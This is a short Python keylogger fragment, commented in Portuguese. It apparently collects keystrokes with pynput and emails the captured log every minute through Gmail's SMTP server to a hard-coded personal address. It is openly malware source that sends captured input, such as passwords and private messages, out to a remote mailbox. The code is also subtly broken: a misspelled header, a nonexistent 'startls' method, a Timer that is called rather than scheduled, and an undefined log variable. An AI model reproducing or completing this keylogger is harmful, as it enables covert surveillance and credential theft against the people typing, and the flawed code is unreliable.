from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações do EMAIL
EMAIL_ORIGEM = "daniel.bomfim.assis@gmail.com"
EMAIL_DESTINO = "daniel.bomfim.assis@gmail.com"
SENHA_EMAIL = "" # Senha do email especificado

def enviar_email():
	global log
	if log:
		message = MIMEText(log)
		message["SUBEJCT"] = "Dados capturados pelo keylogger"
		message["From"] = EMAIL_ORIGEM
		message["To"] = EMAIL_DESTINO
	try:
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.startls()
		server.login(EMAIL_ORIGEM, SENHA_EMAIL)
		server.send_message(message)
		server.quit()
	except Exception:
		print("Erro ao enviar", Exception)

	log = ""

	# Agendar o envio
	Timer(60, enviar_email())
